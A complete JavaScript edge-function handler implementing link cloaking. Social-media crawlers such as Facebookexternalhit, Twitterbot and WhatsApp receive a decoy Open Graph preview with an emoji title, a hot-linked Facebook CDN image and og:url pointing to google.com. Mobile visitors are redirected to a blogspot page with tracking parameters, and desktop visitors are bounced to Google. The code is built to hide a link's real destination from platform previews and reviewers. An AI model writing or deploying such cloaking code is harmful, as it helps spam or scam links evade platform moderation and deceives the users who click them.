export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="💢 💢 💢 💢">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://scontent.fbhv1-1.fna.fbcdn.net/v/t39.30808-6/836859228_122147005365356540_2425544965696033306_n.jpg?stp=dst-jpg_tt6&cstp=mx720x384&ctp=p280x280&_nc_cat=103&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=cc71e4&_nc_ohc=i1ayRY2SI4EQ7kNvwETTwo2&_nc_oc=AdqnF86TkyjNtuS92f95VU9NnwTtoS4yc8B6ZffZPnmC6nvN62yqK6CKqq1kqcqMWCU&_nc_zt=23&_nc_ht=scontent.fbhv1-1.fna&_nc_gid=NTynXWjnXZNdzDr4f8WK9Q&_nc_ss=7b2a8&oh=00_AQOuPlAYKA_6bivPLDoTHbhypYleYLxXlabHmWoCA-LoTg&oe=6ACEF84C">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://waseey.blogspot.com/?utm_source=amsh&utm_medium=ansh6", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
